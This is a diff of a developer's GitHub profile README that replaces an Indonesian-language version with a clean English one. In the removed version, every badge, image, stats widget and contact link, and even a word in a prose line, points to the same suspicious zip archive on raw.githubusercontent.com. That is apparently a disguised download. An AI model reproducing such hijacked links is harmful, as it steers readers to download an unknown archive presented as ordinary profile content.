@@ -1,63 +1,55 @@
-<p align="center">
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="Coding Banner"/>
-  </a>
-</p>
-
-<h1 align="center">Halo, saya M DIAN FAUZI 👋</h1>
-<h3 align="center">Seorang Front End & Back End Developer dari Indonesia 🇮🇩</h3>
-
-<p align="left">
-  Saya adalah seorang engineer yang bersemangat dalam membangun aplikasi web yang modern dan bermanfaat. Saat ini saya sedang fokus untuk mendalami teknologi cloud dan arsitektur microservices.
-</p>
-
-- 🔭 Saya sedang mengerjakan **proyek sistem manajemen inventaris berbasis web**.
-- 🌱 Saya sedang belajar **Go (Golang) dan Kubernetes**.
-- 💬 Tanya saya tentang **JavaScript, React, https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip, dan CSS**.
-- 📫 Cara menghubungi saya: **[https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip]**
-- ⚡ Fakta unik: Saya suka mendengarkan musik lo-fi saat coding.
+<h1 align="center">Hi 👋, I'm M Dian Fauzi</h1>
+<h3 align="center">Informatics Student | Web Developer | AI Enthusiast</h3>
 
 ---
 
-### 🛠️ Bahasa & Tools yang Saya Kuasai:
+## 🚀 About Me
+- 🎓 Informatics Student
+- 💻 Passionate about Web Development
+- 🤖 Exploring Artificial Intelligence
+- 🌱 Currently learning: Next.js & Backend Development
+- ⚡ Fun fact: I love building modern web apps
 
-<p align="left">
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="javascript"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="typescript"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="react"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="nodejs"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="expressjs"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="mongodb"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="git"/> </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="docker"/> </a>
+---
+
+## 🛠 Tech Stack
+
+### 💻 Frontend
+<p>
+  <img src="https://skillicons.dev/icons?i=html,css,js,react,nextjs" />
+</p>
+
+### 🗄 Backend
+<p>
+  <img src="https://skillicons.dev/icons?i=php,nodejs,mysql" />
+</p>
+
+### ⚙ Tools
+<p>
+  <img src="https://skillicons.dev/icons?i=git,github,vscode" />
 </p>
 
 ---
 
-### 📊 Statistik GitHub Saya:
+## 📊 GitHub Stats
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img align="center" src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" />
-  </a>
-  <br><br>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img align="center" src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" />
-  </a>
+  <img src="https://github-readme-stats.vercel.app/api?username=dianfauzi16&show_icons=true&theme=tokyonight" />
+</p>
+
+<p align="center">
+  <img src="https://github-readme-streak-stats.herokuapp.com/?user=dianfauzi16&theme=tokyonight" />
 </p>
 
 ---
 
-### 🔗 Hubungi Saya:
+## 📫 Connect With Me
+- 💼 LinkedIn: https://linkedin.com/in/dian-fauzi-7bb8332ab
+- 🌐 Portfolio: Coming Soon...
+- 📧 Email: dianf7673@gmail.com
+
+---
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="LinkedIn"/>
-  </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="Twitter"/>
-  </a>
-  <a href="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip">
-    <img src="https://raw.githubusercontent.com/dianfauzi16/dianfauzi16/main/Grundyite/dianfauzi-v1.9.zip" alt="Instagram"/>
-  </a>
+  ⭐ From <b>M Dian Fauzi</b> | Building the future with code 🚀
 </p>
